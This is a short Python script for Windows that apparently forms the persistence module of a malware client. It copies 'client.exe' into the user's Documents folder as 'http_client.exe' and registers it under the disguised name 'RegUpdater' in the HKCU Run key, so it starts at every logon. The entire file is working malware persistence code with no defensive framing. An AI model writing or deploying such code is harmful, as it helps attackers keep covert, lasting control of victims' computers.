import os
import shutil
import _winreg as wreg

PATH = os.getcwd().strip('\n')
USERPROF = os.environ['USERPROFILE']
DEST = os.path.join(USERPROF.strip('\n\r'), 'Documents', 'http_client.exe')

def set_persistence():
    if not os.path.exists(DEST):
        shutil.copyfile(os.path.join(PATH, 'client.exe'), DEST)

        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER,
                           'Software\Microsoft\Windows\CurrentVersion\Run',
                           0,
                           wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, DEST)
        key.Close()
    elif PATH != r'C:\Windows\system32':
        os.remove(DEST)
        shutil.copyfile(os.path.join(PATH, 'client.exe'), DEST)
